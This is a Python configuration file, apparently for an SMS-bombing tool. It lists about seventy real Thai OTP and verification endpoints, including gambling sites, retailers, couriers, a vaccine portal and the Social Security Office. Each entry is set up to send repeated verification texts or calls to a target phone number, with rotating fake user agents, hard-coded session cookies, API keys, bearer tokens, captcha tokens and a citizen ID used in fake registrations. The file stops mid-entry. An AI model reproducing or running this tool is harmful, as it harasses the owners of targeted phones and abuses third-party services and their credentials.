# program/API_LIST.py
from fake_useragent import UserAgent
import random
from string import ascii_uppercase, digits

ua = UserAgent()

def randomString(N):
    return ''.join(random.choice(ascii_uppercase + digits) for _ in range(N))

def get_common_headers(referer=None, origin=None, content_type="application/json"):
    headers = {
        "User-Agent": ua.random,
        "Accept": "*/*"
    }
    if referer:
        headers["Referer"] = referer
    if origin:
        headers["Origin"] = origin
    if content_type:
        headers["Content-Type"] = content_type
    return headers

API_CONFIG = {
    "api1": {
        "name": "Gogo-Shop",
        "url": "https://gogo-shop.com/app/index/send_sms",
        "method": "POST",
        "headers": lambda: get_common_headers("https://gogo-shop.com/app/index/register", "https://gogo-shop.com", "application/x-www-form-urlencoded; charset=UTF-8"),
        "data": lambda p: f"type=1&telephone={p}&select=66",
        "success_check": lambda r: '"code":1' in r
    },
    "api2": {
        "name": "Kex-Express",
        "url": "https://io.th.kex-express.com/firstmile-api/v3/keweb/otp/request/{phone}",
        "method": "POST",
        "headers": lambda: {"Appid": "Website_Api", "Appkey": "fcdf0569-c2a1-4dee-bd22-9d5361c047f2", "User-Agent": ua.random, "Origin": "https://th.kex-express.com", "Referer": "https://th.kex-express.com/"},
        "data": None,
        "success_check": lambda r: '"code":200' in r
    },
    "api3": {
        "name": "Jaomuehuay",
        "url": "https://jaomuehuay.io/api/auth/send-otp",
        "method": "POST",
        "headers": lambda: get_common_headers("https://jaomuehuay.io/register/jaomuehuay", "https://jaomuehuay.io"),
        "data": lambda p: {"phone_number": p, "affiliateCode": "jaomuehuay", "type": 1},
        "success_check": lambda r: '"Success":true' in r
    },
    "api4": {
        "name": "Jut8",
        "url": "https://www.jut8.com/api/user/request-register-tac",
        "method": "POST",
        "headers": lambda: get_common_headers("https://www.jut8.com/th-th?signup=1", "https://www.jut8.com"),
        "data": lambda p: {"uname": "", "sendType": "mobile", "country_code": "66", "currency": "THB", "mobileno": p, "language": "th", "langCountry": "th-th"},
        "success_check": lambda r: '"status":true' in r
    },
    "api5": {
        "name": "Cdo888",
        "url": "https://m.cdo888.bet/ajax/submitOTP",
        "method": "POST",
        "headers": lambda: get_common_headers("https://m.cdo888.bet/user/register", "https://m.cdo888.bet", "application/x-www-form-urlencoded; charset=UTF-8"),
        "data": lambda p: f"send_otp={p}",
        "success_check": lambda r: '"status":"success"' in r
    },
    "api6": {
        "name": "Joneslot",
        "url": "https://www.joneslot.me/pussy888/otp.php?m=request",
        "method": "POST",
        "headers": lambda: get_common_headers("https://www.joneslot.me/pussy888/register", "https://www.joneslot.me", "application/x-www-form-urlencoded; charset=UTF-8"),
        "data": lambda p: f"phone={p}",
        "success_check": lambda r: '"errorCode":0' in r.replace(" ","") or '"status":"success"' in r
    },
    "api7": {
        "name": "Swin168",
        "url": "https://play.swin168.me/api/register/sms",
        "method": "POST",
        "headers": lambda: get_common_headers("https://play.swin168.me/register/", "https://play.swin168.me"),
        "data": lambda p: {"phone": p, "agent_id": 1, "country_code": "TH"},
        "success_check": lambda r: '"success"' in r
    },
    "api8": {
        "name": "Johnwick168",
        "url": "https://www.johnwick168.me/signup.php",
        "method": "POST",
        "headers": lambda: get_common_headers("https://www.johnwick168.me/signup.php", "https://www.johnwick168.me", "application/x-www-form-urlencoded; charset=UTF-8"),
        "data": lambda p: f"act=step-1&tel={p}",
        "success_check": lambda r: 'err-' not in r and len(r) > 0
    },
    "api9": {
        "name": "Skyslot7",
        "url": "https://skyslot7.me/member/otp.php?m=request",
        "method": "POST",
        "headers": lambda: get_common_headers("https://skyslot7.me/member/register", "https://skyslot7.me", "application/x-www-form-urlencoded; charset=UTF-8"),
        "data": lambda p: f"phone={p}",
        "success_check": lambda r: '"errorCode":0' in r.replace(" ","") or '"status":"success"' in r
    },
    "api10": {
        "name": "Mgi88",
        "url": "https://mgi88.me/api/otp",
        "method": "POST",
        "headers": lambda: get_common_headers("https://mgi88.me/", "https://mgi88.me"),
        "data": lambda p: {"telefon_number": p, "registrera_typ": ""},
        "success_check": lambda r: '"code":200' in r
    },
    "api11": {
        "name": "DeeCasino",
        "url": "https://play.dee.casino/api/register/sms",
        "method": "POST",
        "headers": lambda: get_common_headers("https://play.dee.casino/register", "https://play.dee.casino"),
        "data": lambda p: {"phone": p, "agent_id": 1, "country_code": "TH"},
        "success_check": lambda r: '"success"' in r or '"status":true' in r
    },
    "api12": {
        "name": "Mgame666",
        "url": "https://gw.mgame666.com/AuthAPI/SendSms",
        "method": "POST",
        "headers": lambda: get_common_headers("https://okmega.pgm77.com/", "https://okmega.pgm77.com"),
        "data": lambda p: {"Phone": p},
        "success_check": lambda r: '"data":null' not in r
    },
    "api13": {
        "name": "Prompkai",
        "url": "https://api.prompkai.com/auth/preRegister",
        "method": "POST",
        "headers": lambda: get_common_headers("https://www.prompkai.com/", "https://www.prompkai.com"),
        "data": lambda p: {"username": p},
        "success_check": lambda r: '"error":false' in r.replace(" ", "")
    },
    "api14": {
        "name": "Fun24",
        "url": "https://www.fun24.bet/_ajax_/v3/register/request-otp",
        "method": "POST",
        "headers": lambda: get_common_headers("https://www.fun24.bet/", "https://www.fun24.bet", "application/x-www-form-urlencoded"),
        "data": lambda p: f"phoneNumber={p}",
        "success_check": lambda r: r.strip() == "[]" or '"success":true' in r
    },
    "api15": {
        "name": "Wm78bet",
        "url": "https://wm78bet.bet/_ajax_/v3/register/request-otp",
        "method": "POST",
        "headers": lambda: get_common_headers("https://wm78bet.bet/", "https://wm78bet.bet", "application/x-www-form-urlencoded"),
        "data": lambda p: f"phoneNumber={p}",
        "success_check": lambda r: r.strip() == "[]"
    },
    "api16": {
        "name": "Happy168",
        "url": "https://m.happy168.xyz/api/otp",
        "method": "POST",
        "headers": lambda: get_common_headers("https://m.happy168.xyz/?hid=V0H3O1B4TH", "https://m.happy168.xyz"),
        "data": lambda p: {"phone_number": p, "register_type": ""},
        "success_check": lambda r: '"code":200' in r
    },
    "api17": {
        "name": "Pgheng",
        "url": "https://pgheng.amaheng.com/api/otp?lang=th",
        "method": "POST",
        "headers": lambda: get_common_headers("https://pgheng.amaheng.com/register?hid=T0F1K1A5RC", "https://pgheng.amaheng.com"),
        "data": lambda p: {"phone_number": p, "register_type": "", "type_otp": "register"},
        "success_check": lambda r: '"code":200' in r
    },
    "api18": {
        "name": "Aplusfun",
        "url": "https://www.aplusfun.bet/_ajax_/v3/register/request-otp",
        "method": "POST",
        "headers": lambda: get_common_headers("https://www.aplusfun.bet/", "https://www.aplusfun.bet", "application/x-www-form-urlencoded"),
        "data": lambda p: f"phoneNumber={p}",
        "success_check": lambda r: r.strip() == "[]"
    },
    "api19": {
        "name": "Cueu77778887",
        "url": "https://api-players.cueu77778887.com/register-otp",
        "method": "POST",
        "headers": lambda: {"User-Agent": ua.random, "Origin": "https://lcbet44.electrikora.com", "Referer": "https://lcbet44.electrikora.com/", "X-Exp-Signature": "62b3e4c0138d8500127860d5", "Content-Type": "application/json"},
        "data": lambda p: {"brands_id": "62b3e4c0138d8500127860d5", "tel": p, "token": "", "captcha_id": "", "lot_number": "", "pass_token": "", "gen_time": "", "captcha_output": ""},
        "success_check": lambda r: "success" in r
    },
    "api20": {
        "name": "Oneforbet",
        "url": "https://api.oneforbet.com/auth/player/phone-check",
        "method": "POST",
        "headers": lambda: {"User-Agent": ua.random, "Origin": "https://ohana888.net", "Referer": "https://ohana888.net/", "X-Site-Id": "26336fef-e961-449c-926d-93db6afef9c4", "X-Agency-Id": "df87f52d-4221-49b6-b6cb-827f92244b72", "Content-Type": "application/json; charset=UTF-8"},
        "data": lambda p: {"phone_number": p},
        "success_check": lambda r: '"status":"success"' in r
    },
    "api21": {
        "name": "Joker123ths",
        "url": "https://m.joker123ths.shop/api/otp",
        "method": "POST",
        "headers": lambda: get_common_headers("https://m.joker123ths.shop/?hid=E0G3S1A4YH", "https://m.joker123ths.shop"),
        "data": lambda p: {"phone_number": p, "register_type": ""},
        "success_check": lambda r: '"code":200' in r
    },
    "api22": {
        "name": "Pigspin",
        "url": "https://jklmn23456.com/api/v1/user/phone/verify",
        "method": "POST",
        "headers": lambda: {"User-Agent": ua.random, "Origin": "https://pigspin.org", "Referer": "https://pigspin.org/", "Content-Type": "application/json"},
        "data": lambda p: {"phone_number": p},
        "success_check": lambda r: '"status":"SUCCESS"' in r
    },
    "api23": {
        "name": "i828th",
        "url": "https://www.i828th.com/api/user/request-register-tac",
        "method": "POST",
        "headers": lambda: {
            "Host": "www.i828th.com", "User-Agent": ua.random, "content-type": "application/json", "Origin": "https://www.i828th.com", "Referer": "https://www.i828th.com/th-th?signup=1",
            "Cookie": "prevUrl=https%3A%2F%2Fwww.google.com%2F; ipcountry=TH;" 
        },
        "data": lambda p: {"uname": f"66{p}", "sendType": "mobile", "country_code": "66", "currency": "THB", "mobileno": p, "language": "th", "langCountry": "th-th"},
        "success_check": lambda r: '"code":1' in r
    },
    "api24": {
        "name": "Thai191",
        "url": "https://www.thai191.com/api/user/request-register-tac",
        "method": "POST",
        "headers": lambda: {"User-Agent": ua.random, "Content-Type": "application/json"},
        "data": lambda p: {"sendType": "mobile", "currency": "THB", "country_code": "66", "mobileno": p, "language": "th", "langCountry": "th-th"},
        "success_check": lambda r: '"code":1' in r
    },
    "api25": {
        "name": "Pgs42s",
        "url": "https://pgs42s.online/api/otp?lang=th",
        "method": "POST",
        "headers": lambda: {"User-Agent": ua.random, "Content-Type": "application/json"},
        "data": lambda p: {"phone_number": p, "register_type": "", "type_otp": "register"},
        "success_check": lambda r: '"success"' in r
    },
    "api26": {
        "name": "PgSlotIn",
        "url": "https://pgsoft.pgslotin.app/api/otp",
        "method": "POST",
        "headers": lambda: {"User-Agent": ua.random, "Content-Type": "application/json", "Origin": "https://pgsoft.pgslotin.app", "Referer": "https://pgsoft.pgslotin.app/"},
        "data": lambda p: {"phone_number": p, "register_type": ""},
        "success_check": lambda r: '"success"' in r
    },
    "api27": {
        "name": "Carsome",
        "url": "https://www.carsome.co.th/website/login/sendSMS",
        "method": "POST",
        "headers": lambda: get_common_headers("https://www.carsome.co.th/sell-car", "https://www.carsome.co.th"),
        "data": lambda p: {"username": p, "optType": 0},
        "success_check": lambda r: '"success":true' in r
    },
    "api28": {
        "name": "SSO",
        "url": 'https://www.sso.go.th/wpr/MEM/terminal/ajax_send_otp',
        "method": "POST",
        "headers": lambda: {
            "User-Agent": ua.random,
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "X-Requested-With": "XMLHttpRequest",
            "Cookie": "PHPSESSID=1s2rdo0664qpg4oteil3hhn3v2; _ga=GA1.3.1824294570.1636876684" # Note: Cookies likely expired
        },
        "data": lambda p: f"dCard=1358231116147&Mobile={p}&password=098098Az&repassword=098098Az&perPrefix=Mr.&cn=Dhdhhs&sn=Vssbsh&perBirthday=5&perBirthmonth=5&perBirthyear=2545&Email=nickytom5879%40gmail.com&otp_type=OTP&otpvalue=&messageId=REGISTER",
        "success_check": lambda r: True
    },
    "api29": {
        "name": "Konvy",
        "url": "https://www.konvy.com/ajax/system.php?type=reg&action=get_phone_code",
        "method": "POST",
        "headers": lambda: {"User-Agent": ua.random},
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api30": {
        "name": "TheConcert",
        "url": "https://www.theconcert.com/rest/request-otp",
        "method": "POST",
        "headers": lambda: {"User-Agent": ua.random},
        "data": lambda p: {'mobile': f"{p}", 'country_code': "TH", 'lang': "th", 'channel': "call", 'digit': '4'},
        "success_check": lambda r: True
    },
    "api31": {
        "name": "ShopGenix",
        "url": "https://shopgenix.com/api/sms/otp/",
        "method": "POST",
        "headers": lambda: {
             "Host": "shopgenix.com",
             "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
             "x-requested-with": "XMLHttpRequest",
             "user-agent": ua.random,
             "origin": "https://shopgenix.com",
             "referer": "https://shopgenix.com/app/5364874/"
        },
        "data": lambda p: f"mobile_country_id=1&mobile={p}",
        "success_check": lambda r: True
    },
    "api32": {
        "name": "NowBet",
        "url": "https://www.nowbet.com/th/api/sendotpth",
        "method": "POST",
        "headers": lambda: {"content-type": "application/x-www-form-urlencoded; charset=UTF-8", "user-agent": ua.random},
        "data": lambda p: f"countryCode=TH&mobileId={p}&lang=th",
        "success_check": lambda r: True
    },
    "api33": {
        "name": "YouPik",
        "url": "https://api.ulive.youpik.com/api-base/sms/sendCode",
        "method": "POST",
        "headers": lambda: {"content-type": "application/x-www-form-urlencoded;charset=UTF-8", "user-agent": ua.random},
        "data": lambda p: f"phone={p}&type=1",
        "success_check": lambda r: True
    },
    "api34": {
        "name": "GkingBet",
        "url": "https://play.gkingbet.com/api/register/sms",
        "method": "POST",
        "headers": lambda: {"User-Agent": ua.random},
        "data": lambda p: {"phone": p, "agent_id": 5, "country_code": "TH"},
        "success_check": lambda r: '"success"' in r
    },
    "api35": {
        "name": "TGFone",
        "url": "https://www.tgfone.com/signin/otp_chk_fast",
        "method": "POST",
        "headers": lambda: {"content-type": "application/x-www-form-urlencoded; charset=UTF-8", "x-requested-with": "XMLHttpRequest", "user-agent": ua.random, "origin": "https://www.tgfone.com", "referer": "https://www.tgfone.com/login"},
        "data": lambda p: f"mobile={p}&type_otp=7",
        "success_check": lambda r: True
    },
    "api36": {
        "name": "Beauticool",
        "url": "https://www.beauticool.com/?m=request_otp",
        "method": "POST",
        "headers": lambda: {"content-type": "application/x-www-form-urlencoded; charset=UTF-8", "x-requested-with": "XMLHttpRequest", "user-agent": ua.random, "origin": "https://www.beauticool.com", "referer": "https://www.beauticool.com/m/signup_tel.php"},
        "data": lambda p: f"tel={p}",
        "success_check": lambda r: True
    },
    "api37": {
        "name": "SaGame",
        "url": "https://api.sa.game/api/Account/SendRegisterVerificationSms",
        "method": "POST",
        "headers": lambda: {"Accept": "application/json; charset=UTF-8", "User-Agent": ua.random, "lobbyId": "23", "userDeviceTypeId": "6", "Origin": "https://sa.game", "Referer": "https://sa.game/"},
        "data": lambda p: {"countryId": 7, "phoneNumber": f"{p}"},
        "success_check": lambda r: True
    },
    "api38": {
        "name": "UfaClub99",
        "url": "https://ufaclub99.com/member/Register/Request_OTP",
        "method": "POST",
        "headers": lambda: {"content-type": "application/x-www-form-urlencoded; charset=UTF-8", "x-requested-with": "XMLHttpRequest", "user-agent": ua.random, "origin": "https://ufaclub99.com", "referer": "https://ufaclub99.com/member/register"},
        "data": lambda p: f"phonetxt={p}",
        "success_check": lambda r: True
    },
    "api39": {
        "name": "UfaClub24",
        "url": "https://aff.ufaclub24.org/pin.php",
        "method": "POST",
        "headers": lambda: {"origin": "https://aff.ufaclub24.org", "content-type": "application/x-www-form-urlencoded", "user-agent": ua.random, "referer": "https://aff.ufaclub24.org/phoneregis.php?invitekey=41bfd20a38bb1b0bec75acf0845530a7"},
        "data": lambda p: f"invitekey=41bfd20a38bb1b0bec75acf0845530a7&txtTel={p}",
        "success_check": lambda r: True
    },
    "api40": {
        "name": "Ufa8",
        "url": "https://ufa8.co/register",
        "method": "POST",
        "headers": lambda: {"origin": "https://ufa8.co", "content-type": "application/x-www-form-urlencoded", "user-agent": ua.random, "referer": "https://ufa8.co/register"},
        "data": lambda p: f"register=1&phone={p}&password=Kan064402&password2=Kan064402&line=Garenarov",
        "success_check": lambda r: True
    },
    "api41": {
        "name": "ToppingTrue",
        "url": "https://topping.truemoveh.com/api/get_request_otp",
        "method": "POST",
        "headers": lambda: {"Accept": "application/json, text/plain, /", "User-Agent": ua.random, "Content-Type": "application/x-www-form-urlencoded", "Referer": "https://topping.truemoveh.com/otp?callback=/campaign/104"},
        "data": lambda p: f"mobile_number={p}",
        "success_check": lambda r: True
    },
    "api42": {
        "name": "Kerry",
        "url": "https://th.kerryexpress.com/website-api/api/OTP/v1/RequestOTP/{phone}",
        "method": "POST",
        "headers": lambda: {"User-Agent": ua.random},
        "data": None, # URL param used
        "success_check": lambda r: True
    },
    "api43": {
        "name": "CognitoAWS",
        "url": "https://cognito-idp.ap-southeast-1.amazonaws.com/",
        "method": "POST",
        "headers": lambda: {"content-type": "application/x-amz-json-1.1", "x-amz-target": "AWSCognitoIdentityProviderService.ResendConfirmationCode", "user-agent": ua.random, "referer": "https://www.bugaboo.tv/members/resetpass/phone"},
        "data": lambda p: {"ClientId": "6g47av6ddfcvi06v4l186c16d6", "Username": f"+66{p[1:]}"},
        "success_check": lambda r: True
    },
    "api44": {
        "name": "BigThailand",
        "url": "https://www.bigthailand.com/authentication-service/user/OTP",
        "method": "POST",
        "headers": lambda: {
            "content-type": "application/json", "user-agent": ua.random,
            "authorization": "Bearer eyJ0eXAiOiJKV1QiLCJlbmMiOiJBMTI4Q0JDLUhTMjU2IiwiYWxnIjoiZGlyIn0..P9LOZOUnXvgw5wDxPqSuCg.jjRU6v4iidkFNv4nROigeng1s9e96LnzplOaml7YSasaTxwozO37IWuq-h6bV5JyxpaRvIL9UCochw-3OciWq_VrORNwnH45b-ziIAhZ-CpLpt1O_4EpM27y7TYXBb_w6DT3BJp1ARkG7CqSouTnGg.2n1G9HbFJzArFH5Rr2m9kg"
        },
        "data": lambda p: {"locale": "th", "phone": f"+66{p[1:]}", "email": "dkdk@gmail.com", "userParams": {"buyerName": "ekek ks", "activateLink": "www.google.com"}},
        "success_check": lambda r: True
    },
    "api45": {
        "name": "Joox",
        "url": "https://api.joox.com/web-fcgi-bin/web_account_manager?optype=5&os_type=2&country_code=66&phone_number=66{phone}&time=1641777424446&_=1641777424449&callback=axiosJsonpCallback2",
        "method": "GET",
        "headers": lambda: {"User-Agent": ua.random},
        "data": None,
        "success_check": lambda r: True
    },
    "api46": {
        "name": "MakroClick",
        "url": "https://ocs-prod-api.makroclick.com/next-ocs-member/user/register",
        "method": "POST",
        "headers": lambda: {"user-agent": ua.random},
        "data": lambda p: {"username": p, "password": "1111a1111A", "name": p, "provinceCode": "74", "districtCode": "970", "subdistrictCode": "8654", "zipcode": "94140", "siebelCustomerTypeId": "710", "locale": "th_TH"},
        "success_check": lambda r: True
    },
    "api47": {
        "name": "Auto1",
        "url": "https://service-api.auto1.co.th/w/user/request-otp-on-register",
        "method": "POST",
        "headers": lambda: {"content-type": "application/json;charset=UTF-8", "user-agent": ua.random},
        "data": lambda p: {"ConsentFlag": "true", "AcceptPolicy": "true", "Tel": f"{p}", "OTPId": "", "Email": "", "FirstName": "", "LastName": ""},
        "success_check": lambda r: True
    },
    "api48": {
        "name": "SMomClub",
        "url": "https://login.s-momclub.com/accounts.otp.sendCode",
        "method": "POST",
        "headers": lambda: {"content-type": "application/x-www-form-urlencoded", "user-agent": ua.random},
        "data": lambda p: f"phoneNumber=%2B66{p[1:]}&lang=th&APIKey=3_R6NL_0KSx2Jyu7CsoDxVYau1jyOIaPzXKbwpatJ_-GZStVrCHeHNIO3L1CEKVIKC&source=showScreenSet&sdk=js_latest&authMode=cookie&pageURL=https%3A%2F%2Fwww.s-momclub.com%2Fprofile%2Flogin&sdkBuild=12563&format=json",
        "success_check": lambda r: True
    },
    "api49": {
        "name": "NocNoc",
        "url": "https://nocnoc.com/authentication-service/user/OTP?b-uid=1.0.661",
        "method": "POST",
        "headers": lambda: {"User-Agent": ua.random},
        "data": lambda p: {"lang": "th", "userType": "BUYER", "locale": "th", "orgIdfier": "scg", "phone": f"+66{p[1:]}", "type": "signup", "otpTemplate": "buyer_signup_otp_message", "userParams": {"buyerName": "dec"}},
        "success_check": lambda r: True
    },
    "api50": {
        "name": "GlobalHouse",
        "url": "https://api-globalhouse.com/sms/requestOTP",
        "method": "POST",
        "headers": lambda: {"authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJBUFAtU2VydmljZSIsImlhdCI6MTYxMDgwNjQ0NDQxM30.0BWQpa9RO61bUpI45ncdngikQX0xmy2fwsRtZsZNlCc", "content-type": "application/json; charset=utf-8", "user-agent": ua.random, "origin": "https://m.globalhouse.co.th", "referer": "https://m.globalhouse.co.th/"},
        "data": lambda p: {"phonNumber": f"{p}"},
        "success_check": lambda r: True
    },
    "api51": {
        "name": "GamingNation",
        "url": "https://gamingnation.dtac.co.th/api/otp/request",
        "method": "POST",
        "headers": lambda: {"User-Agent": ua.random, "Cookie": "i18n_redirected=th;"},
        "data": lambda p: {"template": "register", "phone_no": p, "token": "03AGdBq257kzKUMJ1ob4zTwDWOVXpLdk4FcMHa_nwlf3xt816SvNfzramnqWTE-yrfjWuQHjNlBrgAZlqspYl-5EH6anY7qorOpa_OmjqLK0TeTajlqAeJLh-jd3QfJyjKbPT1ralDApTC5PHpdGVMQ2sdbX3GKPjpGy2-9r27Kgd8ZF2JUuTgrNIS3ljBDYjuAqt6Rbn0me7ikEd0Ns7a3VXL5Gs8UkiOojLgFh5WK8J80zymilWxqkVQX0-KI_NaDcZKDuWwMHzs2-W68U8qbUUb4B0kNfzwfH9PcftDbdbCPZ43ZcWF2xepsvXhIXIipMawBK3H6fvwmUa1G9_-5I9c-DuPnTi7gq27SV12i4uxwwlpzNpNnofPmZ8vOv9tzxgoHCWkCbMgJVPYRl-PogXqpZBLhXHawb2FGxx--OjKuraWRLRg1-nC-ZK0_xcOCTqjCad-dDyP49aC2BWRlJd8VhskCzH0S4B-I6lRg78qSWV3mQ1vbNrsp_Xk3pjfiilZqznCkPLN29vpVezJIyweRKYTMFlV1Q"},
        "success_check": lambda r: True
    },
    "api52": {
        "name": "1112Delivery",
        "url": "https://api.1112delivery.com/api/v1/otp/create",
        "method": "POST",
        "headers": lambda: {"User-Agent": ua.random},
        "data": lambda p: {'phonenumber': f"{p}", 'language': "th"},
        "success_check": lambda r: True
    },
    "api53": {
        "name": "HDMall",
        "url": "https://hdmall.co.th/phone_verifications?express_sign_in=1&mobile={phone}",
        "method": "POST",
        "headers": lambda: {"User-Agent": ua.random},
        "data": None,
        "success_check": lambda r: True
    },
    "api54": {
        "name": "Kaitorasap",
        "url": "https://www.kaitorasap.co.th/api/index.php/send-otp-login-new/",
        "method": "POST",
        "headers": lambda: {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest", "User-Agent": ua.random},
        "data": lambda p: f"phone_number={p}&lag=",
        "success_check": lambda r: True
    },
    "api55": {
        "name": "Freshket",
        "url": "https://api-next-version.freshket.co/baseApi/Users/RequestOtp",
        "method": "POST",
        "headers": lambda: {"user-agent": ua.random, "content-type": "application/json;charset=UTF-8", "x-guest": "Julian"},
        "data": lambda p: {"isDev": "false", "language": "th", "phone": f"+66{p}"},
        "success_check": lambda r: True
    },
    "api56": {
        "name": "VCanBuy",
        "url": "http://m.vcanbuy.com/gateway/msg/send_regist_sms_captcha_new?mobile=66-{phone}",
        "method": "POST",
        "headers": lambda: {"User-Agent": ua.random, "Cookie": "_tt_enable_cookie=1"},
        "data": None,
        "success_check": lambda r: True
    },
    "api57": {
        "name": "Konglor888",
        "url": "https://mapi.konglor888.com/api/otp/register",
        "method": "POST",
        "headers": lambda: {"User-Agent": ua.random},
        "data": lambda p: {"applicant": f"{p}", "serviceName": "konglor888.com"},
        "success_check": lambda r: True
    },
    "api58": {
        "name": "Hit789",
        "url": "https://mapi.hit789.com/api/otp/register",
        "method": "POST",
        "headers": lambda: {"User-Agent": ua.random},
        "data": lambda p: {"applicant": f"{p}", "serviceName": "hit789.com"},
        "success_check": lambda r: True
    },
    "api59": {
        "name": "TrueIDVaccine",
        "url": "https://vaccine.trueid.net/vacc-verify/api/getotp",
        "method": "POST",
        "headers": lambda: {"User-Agent": ua.random},
        "data": lambda p: {"msisdn": f"{p}", "function": "enroll"},
        "success_check": lambda r: True
    },
    "api60": {
        "name": "Fox888",
        "url": "https://lb-api.fox83-sy.xyz/api/otp/register",
        "method": "POST",
        "headers": lambda: {"User-Agent": ua.random},
        "data": lambda p: {"applicant": f"{p}", "serviceName": "fox888.com"},
        "success_check": lambda r: True
    },
    "api61": {
        "name": "EzRegis",
        "url": "https://ezregis01.com/_ajax_/register/request-otp",
        "method": "POST",
        "headers": lambda: {"User-Agent": ua.random},
        "data": lambda p: {"phoneNumber": f"{p}", "affSign": "e1af462f54b57749cb61e4ac010fd0ee"},
        "success_check": lambda r: True
    },
    "api62": {
        "name": "Dung919",
        "url": "https://mapi.dung919.com/api/otp/register",
        "method": "POST",
        "headers": lambda: {"User-Agent": ua.random},
        "data": lambda p: {"applicant": f"{p}", "serviceName": "dung919.com"},
        "success_check": lambda r: True
    },
    "api63": {
        "name": "SET_Regis",
        "url": "https://api.set.or.th/api/member/registration",
        "method": "POST",
        "headers": lambda: {"User-Agent": ua.random},
        "data": lambda p: {"citizenId": "1840201297389", "country": "th", "termFlag": "true", "subscriptionFlag": "true", "email": "bdjsss@gmail.com", "password": "090Kkk12", "gender": "M", "firstName": "แวหยกกว", "lastName": "กวยกจแวกวก", "mobile": f"+66{p}", "captcha": "03AIIukzjHWhfsTpFpujjNmHQnFczifaX2EAd6iHyG_pqg769Dtpj4stj_E13Lg5Tj2LC5gEq0Es5EiMQa3E-Kl6h25rKm890hlxWQcwgOImpWS5BE-vCC0n_SiKPrHzfW-TLU2n1DLpJzVBooR1DZLt_DDtTxvZhap6YDR9m42kJBcIh3rTuhsYavsJ7daNTjzBqo9V7XuHuAjW_o7Bd1RXNhaLEFwJquoTkkjpvT2vjLVmzinm9Kgxr9GWpl-fuCr4GYRwXDydLBKjU-CwqrNk7elYhedS83VlIla_gtH6hF7HuLEvzU_FLt4V622MJIEPwZaAc6ivQjnibX_PwAS1evs67p7GH4CZn7JOE6VCSWDLC6wsz_um4bzygapb9_xjH6U_FhEz-6uIByc9VXlRtBoFHrLEDQhFlwHEqqG3wOS_HY2yPJReDuWgmbTVbdLXGSDf98tYZccz68n4u3g5McEYtIDo6afVObd-7LPcnK3uvi5CqIjoh3cvzyD4j9z5sLNS1yLibOnX6OGPTkG0trp-pjVOICPQ"},
        "success_check": lambda r: True
    },
    "api64": {
        "name": "SET_OTP",
        "url": "https://api.set.or.th/api/otp/request",
        "method": "POST",
        "headers": lambda: {"User-Agent": ua.random},
        "data": lambda p: {"type": "REGISTRATION", "refID": "e865e7a6-e8c7-4adc-a204-90e5bca90ce0", "channel": "MOBILE"},
        "success_check": lambda r: True
    },
    "api65": {
        "name": "BioGaming",
        "url": "https://biogamin1-api.win.game/api/v3/otp/send",
        "method": "POST",
        "headers": lambda: {"content-type": "application/json", "authorization": "Basic a7af349d858e91c6b96426a64148dc41b8de4e2b808537fb1f98556379769ff62d5295bb4d0e1302a91629744cad45d6d175c7752fec4b777536c160137b0c32", "user-agent": ua.random, "origin": "https://wallet.biogaming1.com", "referer": "https://wallet.biogaming1.com/"},
        "data": lambda p: {"tel": f"{p}", "otp_type": "register"},
        "success_check": lambda r: True
    },
    "api66": {
        "name": "SportPlayAuto",
        "url": "https://gateway-sport.apija.tech/iamrobot/frontend/user/send-otp",
        "method": "POST",
        "headers": lambda: {"content-type": "application/json", "user-agent": ua.random, "origin": "https://sport.playauto.cloud", "referer": "https://sport.playauto.cloud/"},
        "data": lambda p: {"tel": f"{p}", "prefix": "KDA"},
        "success_check": lambda r: True
    },
    "api67": {
        "name": "Ufabet191",
        "url": "https://member.ufabet191.tv/api/auth/register-request-otp/",
        "method": "POST",
        "headers": lambda: {"content-type": "application/x-www-form-urlencoded", "x-requested-with": "XMLHttpRequest", "user-agent": ua.random, "origin": "https://member.ufabet191.tv", "referer": "https://member.ufabet191.tv/auth/register", "cookie": "XSRF-TOKEN=eyJpdiI6IndhdW5qNE1ZT1ZNQXJWaUpuLzUwVFE9PSIsInZhbHVlIjoiQk9PZFhxanMrM1pMblIzdEhFc0lSNFJLTkNLZjVyUWNpQkpTV0V6L05OakxtU2xzTk12YUpvSHczQ2d6aTFzcTRXcG05TWM2a3NWUTMxWXJVVXZoR29WT2g0d1JGUEl4YUdOMVQwVVVzNTFuWEh1eDhVOTRDbmE0Zm1qcFhDTmkiLCJtYWMiOiI3ZmQ3MzdhM2MyNTRjNzQ5YWQzZmEyNTJlMjM5Y2M3YjhlYjkzYzgwN2FlY2Y0Y2VjMzhlZTJkODJlNTBkY2E2IiwidGFnIjoiIn0%3D"},
        "data": lambda p: f"tel={p}&_token=Y8NI28Fne5GUrBncQbzPrOb0nOftBiqEa8Cf4rEp",
        "success_check": lambda r: True
    },
    "api68": {
        "name": "LotusCash",
        "url": "https://api.lotuscash.cc/user/sendCode-h5",
        "method": "POST",
        "headers": lambda: {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "User-Agent": ua.random, "Origin": "https://h5.lotuscash.cc", "Referer": "https://h5.lotuscash.cc/"},
        "data": lambda p: f"mobile={p}",
        "success_check": lambda r: True
    },
    "api69": {
        "name": "Pop99",
        "url": "https://pop99.com/api/register-otp",
        "method": "POST",
        "headers": lambda: {"x-white-lable-name": "pop99", "x-exp-signature": "62ff52961948a80011b2ee2c", "content-type": "application/json", "user-agent": ua.random, "origin": "https://pop99.com", "referer": "https://pop99.com/?action=register&refer_code=rusUxi0PRd"},
        "data": lambda p: {"brands_id": "62ff52961948a80011b2ee2c", "tel": f"{p}", "token": ""},
        "success_check": lambda r: True
    },
    "api70": {
        "name": "CH3Plus",
        "url": "https://api-sso.ch3plus.com/user/request-otp",
        "method": "POST",
        "headers": lambda: {"content-type": "application/json", "user-agent": ua.random, "origin": "https://accounts.ch3plus.com", "referer": "https://accounts.ch3plus.com/"},
        "data": lambda p: {"tel": f"{p}", "type": "login"},
        "success_check": lambda r: True
    },
    "api71": {
        "name": "DavyJones",
        "url": "https://davyjones.mrwed.cloud/customer/register/get-otp",
        "method": "POST",
        "headers": lambda: {"content-type": "application/json", "accept-language": "th", "user-agent": ua.random, "origin": "https://member.ufa058.com", "referer": "https://member.ufa058.com/"},
        "data": lambda p: {"countryCode": "TH", "phoneNumber": f"{p}"},
